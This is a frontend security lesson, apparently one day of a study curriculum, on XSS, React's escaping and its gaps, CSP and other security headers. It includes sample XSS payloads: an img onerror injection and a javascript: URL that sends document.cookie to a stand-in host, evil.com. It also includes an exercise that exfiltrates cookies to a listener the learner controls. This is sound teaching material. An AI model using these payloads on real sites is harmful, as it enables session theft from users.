# Day 243 🛡️

**P-243** · 🛡️ **Frontend security** — ⭐⭐ XSS, and the control that survives your mistake

**Time:** 3 hrs · **Mode:** NEW

> ⭐⭐ **The sentence to own: XSS means an attacker's JavaScript runs with your origin's full
> authority — it can read anything the user can see, act as them, and exfiltrate silently — and
> because one of your several hundred dependencies can introduce it without you writing a line, the
> control that matters is the one that limits the damage after the bug exists.**
>
> Today: ⭐ the three XSS types, ⭐⭐ React's protection and its exact holes, CSP, and the other four.

# Part 1 — What XSS actually gets you

```
⭐⭐ ATTACKER JS ON YOUR ORIGIN CAN:
⭐   · ⭐ READ localStorage ⇒ steal the token (Day 235)
⭐   · ⭐⭐ MAKE AUTHENTICATED REQUESTS AS THE USER — HttpOnly does
⭐     NOT stop this. The cookie is attached automatically.
⭐   · read the DOM ⇒ ⭐ everything on screen, including what they typed
⭐   · keylog the password field
⭐   · ⭐⭐ REWRITE THE PAGE — a fake login form on your real domain,
⭐     with your real padlock. THE USER HAS NO WAY TO TELL.
⭐   · exfiltrate to any URL the CSP allows

⭐   ⇒ ⭐⭐ "IT'S JUST A POPUP" IS THE DEMO. THE CAPABILITY IS
⭐     TOTAL CONTROL OF YOUR APP FOR THAT USER.
```

| ⭐ Type | How |
|---|---|
| **Stored** | ⭐⭐ Attacker's payload saved in your DB, served to **every** viewer. **The worst.** |
| **Reflected** | ⭐ Payload in a URL, echoed into the page. Needs a click. |
| **DOM-based** | ⭐⭐ Never touches your server — `location.hash` written into `innerHTML`. **Your server logs show nothing.** |

# Part 2 — ⭐⭐ React's protection, and its four holes

```jsx
<div>{userInput}</div>
// ⭐⭐ SAFE. React escapes it. <script> becomes text, always.
```

```jsx
// ❌ HOLE 1 — the named one
<div dangerouslySetInnerHTML={{ __html: userHtml }} />
// ⭐⭐ IT IS CALLED "dangerously" ON PURPOSE. If you must render
//    HTML, SANITISE FIRST — DOMPurify.sanitize(html) — and sanitise
//    ⭐ ON THE SERVER, or on both.

// ❌ HOLE 2 — URLs. ⭐⭐ REACT DOES NOT VALIDATE THESE.
<a href={userUrl}>click</a>
// ⇒ userUrl = "javascript:fetch('//evil.com?c='+document.cookie)"
// ✅ const safe = /^https?:\/\//i.test(url) ? url : "#";
//    ⭐ also block "data:" and "vbscript:"

// ❌ HOLE 3 — spreading unknown props
<div {...userControlledObject} />        // ⭐ can inject onError, etc.

// ❌ HOLE 4 — an SVG or file uploaded by a user, served from YOUR origin
// ⭐⭐ AN .svg IS A DOCUMENT AND CAN CONTAIN <script>. Serving it
//    from your domain executes it AS your origin. ⭐ Serve uploads
//    from a separate origin, with Content-Disposition: attachment.
```

| ⭐ Also | |
|---|---|
| `eval`, `new Function`, `setTimeout("string")` | ⭐ Never with anything user-influenced |
| `element.innerHTML =` in a `useEffect` | ⭐⭐ You left React's protection entirely |
| Markdown renderers | ⭐ Many allow raw HTML by default. **Check the config.** |
| ⭐⭐ **LLM output rendered as markdown** | Day 447 — **model output is untrusted input.** Rendering it as HTML is the same hole with a friendlier source. |

# Part 3 — ⭐⭐ CSP, the control that survives your mistake

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';        ⭐⭐ NO 'unsafe-inline'
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;   ⭐⭐ LIMITS EXFILTRATION
  frame-ancestors 'none';                    ⭐ anti-clickjacking
  base-uri 'self';
  object-src 'none';
```

```
⭐⭐ WHY CSP IS THE HIGHEST-VALUE HEADER YOU CAN SET

⭐   ⭐ IT ASSUMES YOU WILL HAVE AN XSS BUG. Given ~900 dependencies,
⭐     that is a REASONABLE assumption rather than a pessimistic one.
⭐   ⇒ ⭐⭐ script-src 'self' MEANS INJECTED INLINE SCRIPT DOES NOT RUN
⭐     AT ALL — the bug exists and the exploit does not.
⭐   ⇒ ⭐⭐ connect-src MEANS EVEN IF SCRIPT RUNS, IT CANNOT SEND THE
⭐     DATA TO evil.com. ⭐ THAT IS THE EXFILTRATION CONTROL, and it
⭐     is the same idea as egress filtering on a server.

⭐   ⭐⭐ 'unsafe-inline' IN script-src DISABLES ESSENTIALLY ALL OF THIS.
⭐     ⭐ It is also the easiest way to make a CSP "work", which is why
⭐       most real CSPs are decorative. Use a nonce or a hash.
```

| ⭐ Header | Does |
|---|---|
| ⭐⭐ `Content-Security-Policy` | The one that matters |
| `Strict-Transport-Security` | ⭐ Forces HTTPS, kills downgrade |
| `X-Content-Type-Options: nosniff` | ⭐ Stops a .txt being executed as JS |
| `Referrer-Policy: strict-origin-when-cross-origin` | ⭐⭐ Stops leaking full URLs (with ids) to third parties |
| `Permissions-Policy` | ⭐ Turn off camera/mic/geolocation you do not use |

> ⭐ **Deploy CSP in `Report-Only` first.** Collect violations for a week, fix them, then enforce. A
> CSP rolled out enforcing on day one breaks the site and gets reverted, which is how teams end up
> with no CSP at all.

# Part 4 — The other four

| ⭐ Risk | ⭐⭐ Control |
|---|---|
| **Clickjacking** | ⭐ `frame-ancestors 'none'`. Your app in an invisible iframe over an attacker's page means the user clicks *your* buttons unknowingly. |
| **`target="_blank"`** | ⭐⭐ Add `rel="noopener noreferrer"`. Without it the opened page gets `window.opener` and can **redirect your tab to a phishing page** while the user reads the new one. |
| **Supply chain** | ⭐ Day 221. ⭐⭐ A compromised dependency **is** an XSS you did not write — which is the whole argument for CSP. |
| **Secrets in the bundle** | ⭐ Day 222. Grep `dist/` in CI. |

```
⭐⭐ AND THE ONE THAT IS NOT A FRONTEND FIX AT ALL:
⭐   ⭐ EVERY INPUT VALIDATED ON THE CLIENT IS ALSO VALIDATED ON
⭐     THE SERVER (Day 229), AND EVERY AUTHORIZATION DECISION IS
⭐     THE SERVER'S (Day 236).
⭐   ⇒ ⭐⭐ FRONTEND SECURITY IS ABOUT PROTECTING THE **USER** IN
⭐     THEIR BROWSER. PROTECTING THE **DATA** HAPPENS ON THE SERVER.
⭐     ⭐ CONFUSING THE TWO IS THE ROOT MISTAKE.
```

## Today's build

1. ⭐⭐ **Give yourself stored XSS.** Save `<img src=x onerror=alert(1)>` through your own API, render it with `dangerouslySetInnerHTML`. **Then change the payload to send `document.cookie` to a listener you control.** Watch it arrive.
2. ⭐ Sanitise with DOMPurify. Re-run both payloads.
3. ⭐⭐ Add a `javascript:` URL to an `<a href>` from user data. Click it.
4. ⭐⭐ **Add a CSP in Report-Only.** Collect violations for one session. Then enforce and confirm your injected script no longer runs **even though the bug is still there.**
5. ⭐ Add `connect-src` and confirm the exfiltration `fetch` is now blocked.
6. ⭐ Set the other four headers. Test `target="_blank"` with and without `rel="noopener"`.

## 🎙️ Articulation drill

⭐⭐ **Two minutes: "how do you think about frontend security?"**

Start with the capability, since most people undersell XSS. **XSS means an attacker's JavaScript runs
with my origin's full authority. It reads the DOM, keylogs the password field, makes authenticated
requests as the user — HttpOnly doesn't stop that, the cookie is attached automatically — and it can
rewrite the page into a fake login form on my real domain with my real padlock. "It's just an alert
box" is the demo; the capability is total control of the app for that user.**

Then React's protection and its limits, precisely. **React escapes interpolated values, so the common
case is safe. The holes are `dangerouslySetInnerHTML`, which is named that deliberately; URLs, because
React doesn't validate them and a `javascript:` href executes; spreading unknown props; and
user-uploaded SVGs, which are documents that can contain script and run as my origin if I serve them
from my domain.**

Then the control that actually matters, with its reasoning. **CSP, because it assumes I will have an
XSS bug — with hundreds of dependencies that's a reasonable assumption, not a pessimistic one. With
`script-src 'self'`, injected inline script doesn't run at all: the bug exists and the exploit doesn't.
And `connect-src` means that even if script runs, it can't send the data anywhere — that's egress
filtering for the browser. The catch is `unsafe-inline`, which disables essentially all of it and is
also the easiest way to make a CSP "work", which is why most real CSPs are decorative.**

Close on the boundary. **Frontend security protects the user in their browser. Protecting the data
happens on the server — every client validation is repeated there, and every authorization decision is
made there. Confusing those two is the root mistake.**
